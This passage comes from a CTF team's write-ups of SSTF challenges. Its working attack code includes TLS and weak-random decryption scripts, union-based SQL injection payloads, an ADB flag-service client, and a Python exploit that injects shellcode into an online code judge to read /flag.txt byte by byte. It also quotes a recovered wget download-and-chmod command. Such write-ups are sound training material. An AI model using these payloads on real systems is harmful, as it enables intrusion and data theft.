        master_secret=master_secret
    )


from io import BytesIO, BufferedReader
from wrapper import Wrapper

global handshake_recv_counter
handshake_recv_counter = 0

def parse_wrapper(bytes_buffer : BufferedReader, HandShakeKey):
    global handshake_recv_counter
    wrapper = Wrapper.deserialize(bytes_buffer)
    if wrapper.record_header.size > len(wrapper.payload):
        wrapper.payload += bytes_buffer.read(wrapper.record_header.size - len(wrapper.payload))
    recdata = wrapper.record_header.serialize()
    authtag = wrapper.auth_tag

    ciphertext = wrapper.encrypted_data

    decryptor = AES.new(
        HandShakeKey.server_key,
        AES.MODE_GCM,
        xor_iv(HandShakeKey.server_iv, handshake_recv_counter),
    )
    decryptor.update(recdata)

    plaintext = decryptor.decrypt(bytes(ciphertext))
    handshake_recv_counter += 1

    decryptor.verify(authtag)
    return bytes_buffer, plaintext[:-1]

clienthello = bytes.fromhex('16030100c2010000be0303000000000000000000000000000000000000000000000000000000000000000000000c13011302c02bc02cc02fc0300100008900000013001100000e7777772e676f6f676c652e636f6d000a000400020017000b0002010000230000000d00080006040308040401002b0005040304030300330047004500170041046b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c2964fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5')
serverhello = bytes.fromhex('160303007b02000077030334e2af2f7c45ae218aecc7dcee69147f7add13970df54bae0f8c5fe40c58bfb900130100004f0033004500170041044c498978adb0dbdff8435373188f1dc1bb6cb00bd4ddc4e666bb6be71f0acae0678c2fbe5b188849324b45e5102c80423dcc6d62c19acdbefab83e8922048852002b00020304')

# may need to remove 02
DHE = '4c498978adb0dbdff8435373188f1dc1bb6cb00bd4ddc4e666bb6be71f0acae0'

rand1 = '0000000000000000000000000000000000000000000000000000000000000000'
rand2 = '34e2af2f7c45ae218aecc7dcee69147f7add13970df54bae0f8c5fe40c58bfb9'
totserverhello = '82e71c107c3c2dd5d4f756e9ed66af54a406d1ffc8ad031c3579dc3d71523aac845e9e6d2a211283f9e963bb89a2f8ad16c4cdc431ba0fa2448b79868673c5d57619fa46e5d2f8b62dd2babaf6b42365d5164ed4d4fc7814bbeb6ad4a5df779120191da7a4299feb2c92ec7ff5feab49f634b89446c36e797f32cd71638c50f72d98f7bdd64bcbc45447828ef27fa53376c10d3cf489a0059ef1083d87e5d64bbadeced011aa88123a8549840415d35e1e27cb9fc34f9fa4f2cd2ec4dc30be2c631d305a02c8b4ef4b72d26c4fceb0fcf8582a11d2193642505c6e36974dba6fa4d845b71eaf3598b5026d25e892b86242fddd5f63ec81de433450c9e98bac0a52a12a9523ee6a81cdad2c524cc9539ac4af52991d171338373282fbd3953270716350d92470534839cbaf4620aee861f79a0285e2e79a27ec011efbf3c0fe3c6a6facac877a53138399865535fa146b829f47d0b47f3bd652b7d8fa9ac51cc1f7df67048156c4aa71f18566326e6e362709265fff55f1e7b5269347ec1c024950a436ed45c11a9dd509245a77b43d6d5e341a5b5b219d98112e1ade052d70700ffa2e5d08b446f99f3a0f25de4b98aaa7f1e8a497bc427a24bb8203589b65ce2f3e1592d0ceb55cfd4fcfd836c97c39f4229a63781729b0fe60c507bab91074c856bcf4ae1d71dade8c81bdc1bcacb7a690722125e82670cb539fba2436a2660e6f1e54f27006b8d2b3b14795a8d4ae27d6e978d5eb586d5fe2ae687064ff9e30ec42f66a2760b60a883cdfdc3a8dcddc7a1d60be5e5b5fd895e880b82dc1dd4209a2d498b1fbd92dc48752f0b951636147f49db4b6660acb5287906edcb1e129309dcd85a00ee3ba32b3d7e94435a2160f282eb6605272a1a43602bd68a93fd4ebf01ec8242768a8de037bd3155e4e34da44781f402aaf784931d9d0ba2c93bd42e0a5834869c20917eca4796bee35cbf102a1586608550f8dd4a8ef391526cbf0e955b27197575836b56d8b63fb5196bbc85fb0030007840ea8f9f90bb6a4487e719a6a76259023e5cae2b8230a2e87fa23fe05b12992fb9ecabed4db23ed8e410f948895ba73f9d3f3ccf0f99d7f38d80bbc044fc672dcd028d7a46ca4e50024aa85b28557f8dc233d0799fd5b3a1ce181f3761867b358a2000795f3b23b145827eb3c14ffbd3aed95e244581691ea9991656fa9d1e6c87349286565e49f86a8f024b81f295a8e3a35360242cbc3307e756ae751cf138fe65705753fd191b7e789acd8cb5502c520a9169e2a32358453e8802c7e64086d5f3a2a09fa7136626dd30861b20fafc313fc347509fb1bbd3ef39870ff243238ef29296688bd582282335bbbed7648e2bcf719255a2831c6801086a5784c780e25ce7f52de8ce19ae75796cc52285fb0fe8a348cc707e8b47496bad6f407de0eec812d87c5322c99861c5c2bcaf916786581651b0ecae03970da91bbf7f229c1c3a2ab9f0245310118f809c1af74a4a029681595d91f601defd0cb3a03fd5575b4b0ff4cb12d40f5808b6317ccdbcea21e7b161ef8a97e72d6fc2b0dc4461879f2b668725258d5cc35071711a525950317851f82612c431212dc5363e0bdeeb6a973b4d0523bcbba90921ed1ee1c1f9c3c0130b8a2566c0a8a9636a22188607d5b139fc07c9297cc6b9552fa900b7fef1ac77445fd9bd8a0136c32d1b4e30c7997515cc9319ba3a18ea61513e8b6e85cfec565106eb72fd0172bec92877dfe6009c05db6682f1378f5cb53c6de34e7af501c75e640b25dfc7040cb1728331bf167d82cd14d202aae1db3cdd67155639f255b99dabc416f409251616ea0e991f792bf50cbebc2500e604d60d38e35b50da3cf711bc3d8174afc5fd95250f57c784a4755bcaf961de52ae4f68ab128f6161d2e5631d55ba10ca443d4080f0368e306a7959f3a8bd391bbccbafc603b271e75e190a0a48961243065c8f5dba55cad0852ac6f6a2873c7c7af41da54bef6be271a9bdecb086a278597fcbcc0e055b394d4fe2d8ca1ef8725b66d76b5760cf98545e76bb570b404595b3e7184cbdc174bae09634a84a8b1db02f28f670b0ec97ce45914c7fb49edc7d3c8686eed6a4eed3502c86a1a96e6c3369ce5982da233bbf3cf38340403a45ebfb6ab822bc4e1024d43ec0220bc1201d9aa3c336add8308be4edeae2bf97f8d4d4596bdaae1977a2a886dd1a86912f93056e344420c385c113df9dcc98b056c71d0853208c9f415debc4c141a23b6d234f9cfb4ac672f033a39e6f364b882538f5bd0e06a6a74ae04847299d751c83121f5ed2af690b4b3f41457880b68a9e508c28b81a8a75c9b90dcd8c3b2ea18c4627665c1085620ac81322d0e18bab0581d485f677cb56b371e41479a5cf01c80a0038a960e415a972cee7e0c3a6d82735bc1032949b40dff7f50a710b3d441b35afdd4783737e8304ab6e0bd6564aaa13c8438a165837cca159ba36ecad3d03530b15f8641f0dd62d287ce52d9262359113629bf238bcd9c66a2eed76ec95fed3073715ff748fa4a642fdaf2373397c8db987884180c1ed49f1aed9d30a88505636ad6ddafe9f70dd9d8fc586bacd116deee86b13cb0aa58206fe767c2f46d7d5e4d3e2d3c248cd6377078313586f13bac6ade2af7b61f0b1637a9627b26741f3d03b6a4af7e80c5d7d345063955fc83aeb6c0d88b09f9a28c50764934082be9bb197f1a0398488f05e60611844d65df854a3fe8fd9f7ad02e208430b687c5dc056e8bfe42502bae4ebab8d42b74e1ef2f532c5039171aaaacbd2a18d6ca7efc142cbda3a08d3ab9acdabc932dc4a130e85c7e08df4045027feaaf7b367715c2ebbe515e27250706ce651b5022571cafad139ac4fffe08f5f2a230e1804958d65a287e6714bf74293ad6a29ce29c9d4afb2318d3d62cd8dffe36ac8aceecd477772ee94007d53f5767c14346f582caaa5bb4e905c75ea0daea9c3ca0513cd651e4347a022ba5c3bfdc27e4c8b1e4d6ce17fd4d753dd34e4af67ef79733cac7bfac6193d0a28f2e5d938d61362dc0fa021c95bf0cc6a2ecc4dee7a3ddb24e40e90bfdd037f3b920a16d164f9a3e015c06f0eb62fb58a57655f006b29a537df7e549017afbe0ba42fa6b2e986b8c95b13a3dded61845b7ce8317ebaa46fcf664553acafddf7f12cdee9617fe75eab6148d2cabd508a0c82353b1c025efba558a9526e0fe1e9e8b124bd26f6a5d2c85032b5f48f55477da47008ca2ce789732983ce6600db7470d0efebb7731321015be7a1d4f6618ac0b3cd8449da6a65d19497ec1f799121744a6b661dc77fb3294cf075f605df1f27f80a593d29689c45aa560d3fd6a657faa5e809f52ecfc2b8d38f471c6547fff822313d98f941fd1bbf92f52face29149448c04697b6a0f92be3cdbb5451d6fd18c54bfacfd1d924d242018b22782e03f6fd8d809c2168260954c6f8b42a6d09654f85de7e87b089124f0577ace1e6181ad41ec9784bf322939f8b592ee4'

data = '13c975c5a0bb8d6f65bbffc993249babf103c1b08c4a25e0686c23b036ea0499c6234b5ec6bbb8cb479468ed4ae84e9cacd66240e63b221fa0e472e12c14b831b5258fe0af6c1257fa3d395bcb0fa1f49788724a291a97d40648e1a8cb09f4f47598b12908dd51af8e680401739cac787988d8e865357fcfb38a627a8afce78a20cc7a4cd2a995d10876ded40e8a2eb3493c39270cffae0c508fe6c47029a46ca3eb145cf39b2bd1ef58cf9b9f383e984dad52adc141064b8c7b20114e9e66cf55bd428db817538dfd20319864c50c94470cd95cd4757f7302f494c5c8db38ecc8b117931deb9e557c567e'
totserverhello = bytes.fromhex(totserverhello)
data = bytes.fromhex(data)

# send_client_hello
hello_hash_bytes = clienthello[5: ]


# shared secret
shared_secret = bytes.fromhex(DHE)


bytes_buffer = BufferedReader(BytesIO(serverhello))
original_buffer = bytes_buffer.peek()
sh = ServerHello.deserialize(bytes_buffer)
hello_hash_bytes += original_buffer[5 : sh.record_header.size + 5]

# calculate handshake keys
hello_hash = hsh(hello_hash_bytes)
handshakekeys = derive(shared_secret, hello_hash)


# plaintext
bytes_buffer = BufferedReader(BytesIO(b"\x17\x03\x03\x09\xb5" + totserverhello))


plaintext = bytearray()

bytes_buffer, resplaintext = parse_wrapper(bytes_buffer, handshakekeys)
plaintext += resplaintext
plaintext_buffer = BufferedReader(BytesIO(plaintext))

while True:
    if len(plaintext_buffer.peek()) < 4:
        bytes_buffer, res = parse_wrapper(bytes_buffer, handshakekeys)
        plaintext += res
        plaintext_buffer = BufferedReader(
            BytesIO(plaintext_buffer.peek() + res)
        )
    hh = HandshakeHeader.deserialize(plaintext_buffer.read(4))
    hh_payload_buffer = plaintext_buffer.read(hh.size)
    while len(hh_payload_buffer) < hh.size:
        bytes_buffer, res = parse_wrapper(bytes_buffer, handshakekeys)
        plaintext += res
        plaintext_buffer = BufferedReader(
            BytesIO(plaintext_buffer.peek() + res)
        )

        prev_len = len(hh_payload_buffer)
        hh_payload_buffer = hh_payload_buffer + plaintext_buffer.read(
            hh.size - prev_len
        )
    hh_payload = HANDSHAKE_HEADER_TYPES[hh.message_type].deserialize(
        hh_payload_buffer
    )
    if type(hh_payload) is HandshakeFinishedHandshakePayload:
        break

# print(plaintext)
hello_hash_bytes += plaintext

handshake_hash = hsh(hello_hash_bytes)

application_keys = derive_application_keys(handshakekeys.handshake_secret, handshake_hash)

clkey = application_keys.client_key
cliv = application_keys.client_iv

cipher = AES.new(key = clkey, mode = AES.MODE_GCM, nonce = cliv)
print(cipher.decrypt(data))
```

flag : ``SCTF{RFC8446:The_Transport_Layer_Security_(TLS)_Protocol_Version_1.3_63a3a9e1}``

## Secure Enough

### Analyze

Summary of binary is,

```python
srand(time(0))
key1 = md5(rand()).digest() + md5(rand()).digest()
srand(time(0))
key2 = md5(rand()).digest() + md5(rand()).digest()

server.send(b"\x01" + key1 + RSA_encrpyt_with_pubkey(key2))
key3 = RSA_decrpyt_with_pubkey(server.recv()[1:])

h = md5()
h.update(b'A')
h.update(md52)
h.update(md52)
h.update(md53)
k = h.digest()

h = hashlib.md5()
h.update(b'BB')
h.update(md52)
h.update(md52)
h.update(md53)
k += h.digest()

h = hashlib.md5()
h.update(b'CCC')
h.update(md52)
h.update(md52)
h.update(md53)
iv = h.digest()

// send useless thing to server

cipher = AES.new(k, AES.MODE_CBC, iv)
flag = cipher.decrypt(server.recv())
```

and we have a packet dump that has communication of one full binary execution.

### Solution

Packets are sended in very short time. That means key1 == key2. And can easily get key3 by decrypt the data that server sent with RSA public key.

With key1, key2 and key3, compute k and iv, decrypt the ciphertext.

```python
import binascii
import struct
import hashlib
from Crypto.Cipher import AES
from ctypes import c_int, c_uint

def srand(seed):
    srand.r = [0 for _ in range(34)]
    srand.r[0] = c_int(seed).value
    for i in range(1, 31):
        srand.r[i] = (16807 * srand.r[i - 1]) % 2147483647
    for i in range(31, 34):
        srand.r[i] = srand.r[i - 31]
    srand.k = 0
    for _ in range(34, 344):
        rand()


def rand():
    srand.r[srand.k] = srand.r[(srand.k - 31) % 34] + srand.r[(srand.k - 3) % 34]
    r = c_uint(srand.r[srand.k]).value >> 1
    srand.k = (srand.k + 1) % 34
    return r


b = "01a3e6f484d7865ab1056e15833c748bedb689c0613fa1146a35f129797a7705142e9041559d7b0efb5cca1ec10310091de88fe3d3b85df5862be216ae07c13a25b3554692c441e9a3574275a6b3f3cb7f70e4c4967e7f893fdff2d8279f70d53a9265aea14c86b560e97e813cec1d03ef819d276d0e7e1c0809dabb367dc85c387a2ebc79e2740a89f1b119c7ee978d436b6389cc2be163670f4fb82dd96801cf5d9626f8b903c039b06e7d0d8cfeceb2c21ec6054843628499bd12a741d2d35bdd4361f07148cae759833a4a1ea15d6874c21cafa4934eab3debff36252149a11407bf4196cf18242937757ae408856f1e654a25d9d75849df2b664c6886ee97d5a940d73faf9625b709beda7c1d0f171ca061fe3bf0e6232592d817f9a4a6a60000"

// get key1 and key2 with different way
md51 = binascii.unhexlify(b[2:2 + 0x20 * 2])
c = int(b[64:], 16)
srand(1624347317)
n1 = hashlib.md5(struct.pack("<I", rand())).digest()
n2 = hashlib.md5(struct.pack("<I", rand())).digest()

md52 = n1 + n2


t = "0f4b82b9d771a2625de1339269ead8599308a5119f3c8a3eb2e266f04210c2ac7e5657072ecd5fb777a99a8d57d94e39fa7001dd926ac42e4e9c944cd086868605d59db718caf0738f9983575119e4ae63f84c7a274eba7b39b9dc19a749a9bca7bead0aa75ea8f2c34a48dda8a4812e933249e945f66858785947d95168154b18e44f0ffa4f3c0a336ee2fc72f6b0aa1deeba5cd4646e68ae591923dc2894597862a753c3f86409cc19b8b5070de08fdab340618e6fb9370d95bf07670d76cdf320d5bd3bf10c26ec89f47956a4e6f850f751d7480c82cb25f7a48ba167d207d7a3836c7dee679a7ac1e004e0399598994e7542d63e65eb24b41158c6672872"

c = int(t, 16)

n = 0xdb5e041460a931b421078b91a3b3fd1406a301fbf3ee26a7b218c3e3822f65e6477846137dad7338d6e36062b6970ff4bfec59fc49b833db0f3921a5b0f72bbc6dcef7f5ca334fa17b4e4b87c9de76d327a4e420c4587024d6dd291dd2633b07f3e27388b1c098a4269661fc141884ade1acb21021202af3f061830a30e0ec06a6e302a3d0763a85f8fccd462301fd8cc68a335886059a3497236c70a7a2aa52a85a73d5b49e74244e87bebed06395c3e8c1157d59588d201da6b04e9a7def98a8a55260d8b36c45d26e6a1cb00f808e86f88b5bbc2c0b5d778cc5e60986b8a08921388c32095a907cf0a2c5d77db7a321a265a5f0bab31e3122eea7931e9895
e = 0x10001
m = pow(c, e, n)

md53 = binascii.unhexlify(hex(m)[-64:])

h = hashlib.md5()
h.update(b'A')
h.update(md52)
h.update(md52)
h.update(md53)
k = h.digest()

h = hashlib.md5()
h.update(b'BB')
h.update(md52)
h.update(md52)
h.update(md53)
k += h.digest()

h = hashlib.md5()
h.update(b'CCC')
h.update(md52)
h.update(md52)
h.update(md53)
iv = h.digest()

h = hashlib.md5()
h.update(b'DDDD')
h.update(md52)
h.update(md52)
h.update(md53)
#iv += h.digest()

cipher = AES.new(k, AES.MODE_CBC, iv)
print(cipher.decrypt(binascii.unhexlify('dc014f2266d9368dbd6fb5d3fa1d675cc2172ae703872afbadc94dc8cbc8afcda7c1177253fe51114041ad0103bbb86500000000000000000000000000000000'))[1:].split(b"\x00")[0])
```

`SCTF{B3_CAR3_FULL_W1T4_RAND0M}`

## Logic Or Die

### Analyze

After some observation and guessing, it's look like tiny CPU, but all of opcodes just check the memory of SECRET KEY or print some texts to TTY.

Upper part is translating instruction.

Format of instruction is

```
00 AA BB CC
AA : opcode
BB : arg1 or jump to BB if flag = True
CC : jump to CC if flag = False
```

Decoder on top gets `opcode` and gives a signal to checking routine to run.

With omitting the part of how to read this logic, the check of each opcode is

```
skey = Secret Key Rom
00 : return RotateLeft(skey[2], 5) ^ 0x34 == 0x98
01 : return skey[3] == 0x67(== ~(0x99 ^ 1)
02 : return skey[7] >> 3 == 0x0d and bitcount(skey[7]) == 5 
03 : return skey[4] + 0xa3 == 0x5 and skey[4] - 0xa3 == 0xbe (mod 0x100)
04 : return ~(-skey[6] ^ 0x4) = 0x36
05 : v1 = skey[5] ^ skey[0]
     v2 = skey[0] ^ skey[1]
     return v1 + v2 == 0x6c and v1 - v2 == 0xc
06 : v = 42
     for i in range(0x80):
         if v == 1 and skey[5] == i:
             return True
         v = rand(v)
     return False
```

opcode `07, 08` are some preprocessing of RC4(maybe) and `09` is decrypt(or encrypt) one byte(`arg1`).

opcode `0d` prints `ERROR` and ends and opcode `0a` just ends the program. 

For opcode `00~06`, possible input that return True is

```
00 : skey[2] = 0x65
01 : skey[3] = 0x67
02 : skey[7] = 0x6b or skey[7] = 0x6d or skey[7] = 0x6e
03 : skey[4] = 0x61
04 : skey[6] = 0x33
06 : skey[5] = 0x65 (use in 05)
05 : skey[5] = 0x65 and skey[0] = 0x59 and skey[1] = 0x69
```

 We have three valid key that doesn't print `ERROR`.

```
[0x59, 0x69, 0x65, 0x67, 0x61, 0x65, 0x33, 0x6e]
[0x59, 0x69, 0x65, 0x67, 0x61, 0x65, 0x33, 0x6b]
[0x59, 0x69, 0x65, 0x67, 0x61, 0x65, 0x33, 0x6d]
```

Try all three to find the key that prints valid flag. Correct key is first one with 0x6e.

`SCTF{lOgic_e1em3nt5_maTteRs}`

## SQLi 102

There is a SQLi in the keyword search. Get the table names.

```sql
' and 2=1 union select 1,table_name,3,4,5,6,7,8 from information_schema.tables-- -
```

Notice the `findme` table at the end, and grab its column names.

```sql
' and 2=1 union select 1,column_name,3,4,5,6,7,8 from information_schema.columns where table_name='findme'-- -
```

Combine the column names to form the flag.
`SCTF{b451c_SQLi_5k1lls}`

## ADBaby

At start, we struggled with the usage of `adb` against the provided target. Basically, anything useful has been greeted with the message `blocked`. It was clear that access to anything containing `'./', '../', 'data', 'local', 'tmp', 'flag'` is strictly prohibited. After a while, we tried to `adb pull /proc/self/exe`, and to our great surprise, we retrieved some sort of the containing library (based on `libminijail`).

After reversing it, we concluded that it provides an extra `adb` service called `Flag Service`, which could be invoked by calling the remote method named `flag`. Additionally, we found that while interacting with it, we are supposed to send it a `password`, which should have a prefix (hexadecimal) value of its MD5 digest as `0123456`. By some simple brute forcing, on randomly generated printable samples, we found one such value to be `MaUFpm`.

To successfully interact with the target, we modified the library https://github.com/Swind/pure-python-adb, where we added an extra command `flag` into the `ppadb/command/transport/__init__.py`, which basically behaves in a similar matter as the `shell` command.

```python
class Transport(Command):
    ...
    def flag(self, handler=None, timeout=None):
        conn = self.create_connection(timeout=timeout)

        cmd = "flag:"
        conn.send(cmd)
        conn.read(128)

        try:
            conn._send("MaUFpm\n")
        except Exception as ex:
            exit(ex)

        if handler:
            handler(conn)
        else:
            result = conn.read_all()
            conn.close()
            return result.decode('utf-8')
```

As a result of using this newly defined command (by using it as in following excerpt), we got the flag `SCTF{Do_U_th1nk_th1s_1s_adb}`

```python
from ppadb.client import Client as AdbClient

client = AdbClient(host="127.0.0.1", port=5037)     # after `adb connect adbaby.sstf.site:6666` from CLI
device = client.device("adbaby.sstf.site:6666")
print(device.flag())
```

## Remains

After the initial analysis, we found some interesting artifacts in the memory, like `wget http://192.168.0.106:8080/sav && chmod +x`, `Wanna flag?` and the PNG of a file containing the run of the downloaded executable `sav`. So, we concluded that we are searching for that same executable `sav`. As the memory dump did not appear as too usable for doing any kind of carving (i.e. extraction) for that same executable, we tried to search for the trails of its run.

We found an interesting binary string, having a prefix `SCTF{`, which appeared as some kind of obfuscated flag. As in similar cases, usually it is some kind of XOR encryption involved, we tried our luck and used that same prefix with the binary blob after it. As a result we got a slightly "broken", but clearly readable piece of the flag `SCTF{m3m0ry_15_7h3_k3y_n07_70...457_bu7_70_7h3_ch4ll3n63!}`. By doing some XOR of aligned memory parts, we reconstructed that the letter before `457` is actually `p` (for `p457`). After some guessing (after all, we are Super Guessers), we finally found that the flag is actually `SCTF{m3m0ry_15_7h3_k3y_n07_70_7h3_p457_bu7_70_7h3_ch4ll3n63!}`.

## SW Expert Academy

- Create a request that opens the flag via shellcode and checks the n'th byte 

- Use multiple requests to do a binary search per flag character Exploit will find flag char by char:

```
S
SC
SCT
SCTC
SCTC{
SCTC{t
SCTC{ta
SCTC{tak
SCTC{takc
SCTC{take-
SCTC{take-c
...
SCTC{take-care-when-execute-unknown-cod
SCTC{take-care-when-execute-unknown-code
SCTC{take-care-when-execute-unknown-code}
SCTC{take-care-when-execute-unknown-code}\x00
SCTC{take-care-when-execute-unknown-code}\x00
```

```python
#!/usr/bin/python
from pwn import *
import requests

# SCTF{take-care-when-execute-unknown-code}

BASEURL = "http://swexpertacademy2.sstf.site/code"
SESSION = requests.Session()

respw = ""
cur_off = 0

"""
mov    rbx,rsp
mov    r8,rdi
push   0x74
mov    rax,0x78742e67616c662f
push   rax
mov    rdi,rsp
xor    esi,esi
xor    edx,edx
push   0x2
pop    rax
syscall 
mov    rdi,rax
mov    rsi,r8
xor    edx,edx
mov    dx,0x12c
xor    eax,eax
syscall 
mov    rsp,rbx
ret
"""

# byte binary search, sending multiple requests for each flag byte
while True:
	range_low = 0
	range_high = 128

	testchar = (range_high+range_low) / 2

	for i in range(0, 9):
		testchar = (range_high+range_low) / 2

		file = """
    unsigned char flagbuf[100];
    unsigned char shellcode[] = {'H','\\x89','\\xe3','I','\\x89','\\xf8','j','t','H','\\xb8','/','f','l','a','g','.','t','x','P','H','\\x89','\\xe7','1','\\xf6','1','\\xd2','j','\\x02','X','\\x0f','\\x05','H','\\x89','\\xc7','L','\\x89','\\xc6','1','\\xd2','f','\\xba',',','\\x01','1','\\xc0','\\x0f','\\x05','H','\\x89','\\xdc','\\xc3',};
    mprotect( ((unsigned long long)&shellcode) - ( ((unsigned long long)&shellcode)&0xfff ) ,0x1000,7);
    void (*f)(char *) = &shellcode;

    // call shellcode
    f(&flagbuf);

    // check current byte
    if(flagbuf[%d] >= %d){
        puts("2/3");	// pass 1 test case
    } else {
        puts("A");		// pass no test case
    }
		""" % (cur_off, testchar)

		result = SESSION.post(format(BASEURL),{ "code" : file }).text
		
		res = "true" in result
		
		if res:
			range_low = testchar
		else:
			range_high = testchar

	cur_off += 1
	respw += chr(testchar)

	print respw
```



We skipped the write up for challenges, "bof101", "bof102", "sqli101" because an admin named matta said that we can skip tutorials.

